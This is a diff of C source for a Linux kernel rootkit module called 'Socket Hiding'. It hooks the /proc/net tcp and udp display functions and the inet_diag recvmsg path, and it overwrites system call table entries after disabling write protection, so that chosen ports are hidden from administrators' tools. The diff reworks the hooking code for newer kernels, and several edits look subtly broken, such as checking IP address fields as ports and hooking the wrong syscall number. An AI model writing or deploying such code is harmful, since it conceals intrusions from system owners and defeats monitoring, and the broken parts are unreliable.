@@ -7,26 +7,30 @@
  */
 
 
-#include "socket_hiding.h"
 #include <linux/module.h>
 #include <linux/kernel.h>
-#include <linux/sched.h>
 #include <linux/unistd.h>
 #include <linux/mm_types.h>
+#include <linux/types.h>
 #include <asm/uaccess.h>
 #include <linux/dirent.h>
+#include <linux/sched.h>
 #include <linux/proc_fs.h>
 #include <linux/namei.h>
 #include <linux/seq_file.h>
+#include <linux/inet_diag.h>
+#include <linux/profile.h>
 #include <net/tcp.h>
 #include <net/udp.h>
-#include <linux/inet_diag.h>
+#include <net/inet_sock.h>
 
 #include "sysmap.h"
 /* #include "proc_internal.h" */
 
+#define MAX_HIDE_PORTS 99
 #define SOCKET_STATE_VISIBLE 0
 #define SOCKET_STATE_HIDDEN 1
+#define syscalls ((void**)SM_sys_call_table)
 
 void disable_ro(void)
 {
@@ -47,9 +51,11 @@ int socket_hiding_state = SOCKET_STATE_VISIBLE;
 int (*real_tcp4_seq_show)(struct seq_file*, void*);
 int (*real_udp4_seq_show)(struct seq_file*, void*);
 asmlinkage long (*real_socketcall)(int, unsigned long*);
-int (*real_packet_rcv)(struct sk_buff*, struct net_device*,
-        struct packet_type*, struct net_device*);
-
+int (*real_packet_rcv)( struct sk_buff*,
+                        struct net_device*,
+                        struct packet_type*,
+                        struct net_device* );
+asmlinkage long (*real_sys_recvmsg)(int, struct msghdr*, unsigned) = (void*) SM_sys_recvmsg;
 void** tcp_hook_fn_ptr;
 void** udp_hook_fn_ptr;
 
@@ -138,7 +144,7 @@ inline int hide_tcp_port(short port)
 inline int hide_udp_port(short port)
 {
     // Convert port to host format
-    return port_in_list(ntohs(port), udp_port_to_hide, num_udp_port_to_hide);
+    return check_port_in_list(ntohs(port), udp_port_to_hide, num_udp_port_to_hide);
 }
 
 /*
@@ -149,7 +155,7 @@ int fake_tcp4_seq_show(struct seq_file *seq, void *v)
     struct tcp_iter_state* st;
     struct inet_sock* isk;
     struct inet_request_sock* ireq;
-    struct inet_timewait_sock* itw;
+    /* struct inet_timewait_sock* itw; */
 
     if (v == SEQ_START_TOKEN) {
         return real_tcp4_seq_show(seq, v);
@@ -161,18 +167,13 @@ int fake_tcp4_seq_show(struct seq_file *seq, void *v)
         case TCP_SEQ_STATE_LISTENING:
         case TCP_SEQ_STATE_ESTABLISHED:
             isk = inet_sk(v);
-            if (hide_tcp_port(isk->sport) || hide_tcp_port(isk->dport)) {
+            if (hide_tcp_port(isk->inet_sport) || hide_tcp_port(isk->inet_dport)) {
                 return 0;
             }
             break;
         case TCP_SEQ_STATE_OPENREQ:
             ireq = inet_rsk(v);
-            if (hide_tcp_port(ireq->loc_port) || hide_tcp_port(ireq->rmt_port)) {
-                return 0;
-            }
-        case TCP_SEQ_STATE_TIME_WAIT:
-            itw = inet_twsk(v);
-            if (hide_tcp_port(itw->tw_sport) || hide_tcp_port(itw->tw_dport)) {
+            if (hide_tcp_port(ireq->ir_loc_addr) || hide_tcp_port(ireq->ir_rmt_addr)) {
                 return 0;
             }
         default:
@@ -193,7 +194,7 @@ int fake_udp4_seq_show(struct seq_file *seq, void *v)
     }
 
     isk = inet_sk(v);
-    if (hide_udp_port(isk->sport) || hide_udp_port(isk->dport)) {
+    if (hide_udp_port(isk->inet_sport) || hide_udp_port(isk->inet_dport)) {
         return 0;
     }
     return real_udp4_seq_show(seq, v);
@@ -211,12 +212,12 @@ struct proc_dir_entry* get_pde_subdir(struct proc_dir_entry* pde, const char* na
 asmlinkage long fake_recvmsg(int fd, struct msghdr __user *umsg, unsigned flags)
 {
     // Call the real function
-    long ret = fn_sys_recvmsg(fd, umsg, flags);
+    long ret = real_sys_recvmsg(fd, umsg, flags);
 
     // Check if the file is really a socket and get it
     int err = 0;
-    struct socket* s = sockfd_lookup(fd, &err);
-    struct sock* sk = s->sk;
+    struct socket *s = sockfd_lookup(fd, &err);
+    struct sock *sk = s->sk;
 
     // Check if the socket is used for the inet_diag protocol
     if (!err && sk->sk_family == AF_NETLINK && sk->sk_protocol == NETLINK_INET_DIAG) {
@@ -228,7 +229,7 @@ asmlinkage long fake_recvmsg(int fd, struct msghdr __user *umsg, unsigned flags)
         // Copy data from user space to kernel space
         struct msghdr* msg = kmalloc(ret, GFP_KERNEL);
         int err = copy_from_user(msg, umsg, ret);
-        struct nlmsghdr* hdr = msg->msg_iov->iov_base;
+        struct nlmsghdr* hdr = msg->msg_iter->iov_base;
         if (err) {
             return ret; // panic
         }
@@ -275,12 +276,15 @@ asmlinkage long fake_socketcall(int call, unsigned long __user *args)
     }
 }
 
-void enable_socket_hiding(void)
-{
-    struct net* net_ns;
+
+int init_module(void){
+    struct kobject *mod_kobj = &(((struct module *)(THIS_MODULE))->mkobj).kobj;
+
+    printk(KERN_INFO "Socket Hiding loaded.\n");
+    struct net *net_ns;
 
     if (socket_hiding_state == SOCKET_STATE_HIDDEN) {
-        return;
+        return 0;
     }
 
     // Iterate all net namespaces
@@ -304,15 +308,18 @@ void enable_socket_hiding(void)
         *udp_hook_fn_ptr = fake_udp4_seq_show;
     }
 
-    syscall_table_modify_begin();
-    HOOK_SYSCALL(socketcall);
-    syscall_table_modify_end();
+    disable_ro();
+    real_socketcall = syscalls[__NR_socket];
+    syscalls[__NR_socket] = fake_socketcall;
+    enable_ro();
 
     socket_hiding_state = SOCKET_STATE_HIDDEN;
+
+    return 0;
 }
 
-void disable_socket_hiding(void)
-{
+void cleanup_module(void){
+    printk(KERN_INFO "Socket Hiding unloaded.\n");
     if (socket_hiding_state == SOCKET_STATE_VISIBLE) {
         return;
     }
@@ -320,29 +327,11 @@ void disable_socket_hiding(void)
     *tcp_hook_fn_ptr = real_tcp4_seq_show;
     *udp_hook_fn_ptr = real_udp4_seq_show;
 
-    syscall_table_modify_begin();
-    RESTORE_SYSCALL(socketcall);
-    syscall_table_modify_end();
+    disable_ro();
+    syscalls[__NR_socket] = real_socketcall;
+    enable_ro();
 
     socket_hiding_state = SOCKET_STATE_VISIBLE;
-
-    return;
-}
-
-
-
-int init_module(void){
-    struct kobject* mod_kobj = &(((struct module *)(THIS_MODULE))->mkobj).kobj;
-
-    printk(KERN_INFO "Socket Hiding loaded.\n");
-    enable_socket_hiding();
-
-    return 0;
-}
-
-void cleanup_module(void){
-    printk(KERN_INFO "Socket Hiding unloaded.\n");
-    disable_socket_hiding();
 
     return;
 }
